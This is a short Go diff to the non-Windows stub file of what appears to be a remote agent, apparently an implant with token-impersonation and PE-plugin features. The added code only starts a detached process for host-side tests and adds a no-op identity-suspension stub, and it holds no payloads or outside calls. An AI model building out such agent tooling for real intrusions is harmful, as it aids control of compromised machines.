@@ -23,6 +23,16 @@ func detachSpawnCommand(command *exec.Cmd) {
 	command.SysProcAttr = &syscall.SysProcAttr{Setsid: true}
 }
 
+// startDetachedAgent supports host-side tests; managed agents remain Windows-only.
+func startDetachedAgent(command *exec.Cmd) (int, string, bool, error) {
+	if err := command.Start(); err != nil {
+		return 0, "", false, err
+	}
+	pid := command.Process.Pid
+	go func() { _ = command.Wait() }()
+	return pid, "exec", false, nil
+}
+
 func loadPluginPE(*http.Client, *config, string, string, string) (string, error) {
 	return "", errors.New("PE plugins require the Windows agent build")
 }
@@ -61,8 +71,11 @@ func rev2selfAction() (string, error) {
 
 func applyCommandToken(*exec.Cmd) {}
 
-func reestablishThreadToken()       {}
-func temporarilyRevertForCallback() {}
+func reestablishThreadToken() {}
+
+func suspendServerIdentity() (func() error, error) {
+	return func() error { return nil }, nil
+}
 
 func processUserIdentity() string { return username() }
 
